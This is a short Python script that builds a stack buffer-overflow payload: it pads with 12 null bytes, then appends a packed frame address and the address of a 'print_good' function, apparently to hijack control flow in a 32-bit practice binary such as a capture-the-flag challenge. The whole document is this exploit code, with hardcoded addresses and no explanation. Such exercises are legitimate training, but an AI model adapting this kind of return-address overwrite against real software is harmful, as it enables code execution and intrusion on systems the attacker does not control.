from struct import pack

print_good_addr = 0x0804889c
frame_addr = 0xbffefe28
good_addr_end = pack("<I", print_good_addr);
frame_addr_end = pack("<I", frame_addr);

print("\x00"*12+str(frame_addr_end)+str(good_addr_end))
